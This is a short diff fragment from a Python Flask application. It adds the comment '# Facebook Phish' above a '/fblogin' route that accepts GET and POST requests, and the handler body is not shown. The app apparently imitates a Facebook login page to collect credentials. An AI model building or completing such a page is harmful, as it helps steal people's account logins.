@@ -13,6 +13,8 @@ app = Flask(__name__)
 def home():
     return render_template('index.html')
 
+
+# Facebook Phish
 @app.route("/fblogin", methods=["GET", "POST"])
 
 def log_in():
